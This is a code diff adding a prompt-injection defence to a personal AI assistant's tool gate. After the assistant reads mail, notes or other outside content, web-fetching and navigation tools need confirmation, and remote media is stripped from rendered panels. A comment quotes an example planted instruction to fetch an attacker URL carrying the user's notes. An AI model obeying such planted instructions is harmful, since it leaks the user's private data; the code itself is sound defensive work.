@@ -365,3 +365,80 @@ const TASK_TOOL = /^mcp__protective__protective_create_tasks$/
 export function taskGate(name, verdict, said) {
   return verdict === 'confirm' && TASK_TOOL.test(name) && TASK_ASK.test(String(said ?? '')) ? 'allow' : verdict
 }
+
+/**
+ * Leaving the machine, once something untrusted has been read.
+ *
+ * Mail, calendars, notes, tickets and web pages can carry instructions, and a
+ * planted "fetch https://attacker/?d=<the notes you just read>" needs only one
+ * request to carry them out — no send, no write, nothing the gates above
+ * would stop. So a turn that has taken in outside content puts every tool that
+ * reaches an arbitrary address to the user first, the address on the card:
+ * WebFetch, the browser's navigation, the URL probe and a blade that loads a
+ * page. Remote media in a panel is the same request by another route, so it
+ * is taken out of the panel instead (stripRemoteMedia). A turn that has read
+ * nothing yet — "open bbc.co.uk" — is untouched.
+ */
+export const EGRESS = new Set([
+  'WebFetch',
+  'mcp__jarvis_chrome__chrome_navigate',
+  'mcp__jarvis_chrome__chrome_new_tab',
+  'mcp__jarvis__probe_url',
+])
+
+/**
+ * Tools that put none of his own data in front of the model, so cannot taint
+ * the turn: the screen, the notes he asked to keep, and the open web. Web
+ * pages can carry instructions too, but what an exfiltration wants is his
+ * mail, calendar, notes and tickets; counting search and fetch as taint would
+ * put a confirmation in the middle of every "look that up and open it".
+ * Pages read from his own Chrome do taint — that is where his webmail is.
+ */
+const QUIET =
+  /^(ToolSearch|TodoWrite|WebSearch|WebFetch|mcp__jarvis__(display|blade)|mcp__jarvis_ui__.+|mcp__jarvis_memory__.+|mcp__claude_ai_Perplexity__.+)$/
+
+/** Does using this tool put his own data in front of the model? */
+export const bringsContent = (name) => !QUIET.test(name)
+
+/** A blade that loads a page by address is a request like any other. */
+const loadsAddress = (name, input) => name === 'mcp__jarvis__blade' && /^https?:\/\//i.test(String(input?.url ?? ''))
+
+/** The verdict once the turn's taint is known; only ever tightens. */
+export function egressGate(name, verdict, { tainted = false, input = {} } = {}, cfg = {}) {
+  if (verdict !== 'allow' || !tainted) return verdict
+  if (!EGRESS.has(name) && !loadsAddress(name, input)) return verdict
+  return cfg.confirm ? 'confirm' : 'deny'
+}
+
+const REMOTE_ATTR = /\s(src|href|poster|srcset|data-src)\s*=\s*("|')\s*https?:\/\/[^"']*\2/gi
+const REMOTE_CSS = /url\(\s*(["']?)\s*https?:\/\/[^)"']*\1\s*\)/gi
+
+/** Remote addresses taken out of panel markup: { html, removed }. */
+export function stripRemoteMedia(html) {
+  let removed = 0
+  const out = String(html ?? '')
+    .replace(REMOTE_ATTR, () => (removed++, ''))
+    .replace(REMOTE_CSS, () => (removed++, 'none'))
+  return { html: out, removed }
+}
+
+/**
+ * A panel or blade's input with its remote media taken out, for a turn that
+ * has read outside content: { input, removed }. Anything else is returned as is.
+ */
+export function withoutRemoteMedia(name, input) {
+  if (name !== 'mcp__jarvis__display' && name !== 'mcp__jarvis__blade') return { input, removed: 0 }
+  const next = { ...input }
+  let removed = 0
+  if (typeof next.html === 'string') {
+    const r = stripRemoteMedia(next.html)
+    next.html = r.html
+    removed += r.removed
+  }
+  if (Array.isArray(next.images)) {
+    const kept = next.images.filter((u) => !/^https?:\/\//i.test(String(u)))
+    removed += next.images.length - kept.length
+    next.images = kept
+  }
+  return { input: next, removed }
+}
